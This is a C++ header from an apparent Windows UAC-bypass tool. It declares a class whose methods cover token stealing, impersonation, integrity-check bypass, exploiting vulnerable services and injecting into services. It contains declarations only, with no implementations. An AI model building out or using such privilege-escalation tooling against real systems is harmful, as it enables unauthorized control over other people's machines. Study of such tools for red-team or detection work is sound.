#ifndef UAC_BYPASS_TOKEN_ELEVATION_H
#define UAC_BYPASS_TOKEN_ELEVATION_H

#include <windows.h>
#include <vector>
#include <string>
#include "Logger.h"
#include "SecurityUtils.h"

namespace uac_bypass {

class TokenElevation {
public:
    static TokenElevation& getInstance();

    bool initialize();
    void cleanup();

    bool elevateStandardUser(DWORD processId);
    bool createElevatedProcess(const std::wstring& commandLine);

private:
    TokenElevation();
    ~TokenElevation();
    
    TokenElevation(const TokenElevation&) = delete;
    TokenElevation& operator=(const TokenElevation&) = delete;

    // Token stealing methods
    bool findTargetProcess(DWORD& pid);
    bool stealProcessToken(DWORD pid, HANDLE& hToken);
    bool duplicateAndModifyToken(HANDLE sourceToken, HANDLE& newToken);
    bool impersonateToken(HANDLE hToken);
    
    // System process manipulation
    bool findSystemProcess(std::vector<DWORD>& pids);
    bool analyzeProcessTokens(const std::vector<DWORD>& pids);
    bool extractPrivilegedToken(HANDLE hProcess, HANDLE& hToken);

    // Security descriptor manipulation
    bool modifyTokenSecurity(HANDLE hToken);
    bool elevateTokenPrivileges(HANDLE hToken);
    bool modifyTokenGroups(HANDLE hToken);
    bool bypassIntegrityChecks(HANDLE hToken);

    // Service exploitation
    bool findVulnerableService(std::wstring& serviceName);
    bool exploitService(const std::wstring& serviceName);
    bool injectIntoService(HANDLE hService);
    bool extractServiceToken(HANDLE hService, HANDLE& hToken);

    Logger& logger;
    bool initialized;
    HANDLE currentToken;

    static const DWORD TARGET_SESSION_ID = 1;
    static const WCHAR* SYSTEM_PROCESSES[];
    static const WCHAR* TARGET_SERVICES[];
};

} // namespace uac_bypass

#endif // UAC_BYPASS_TOKEN_ELEVATION_H
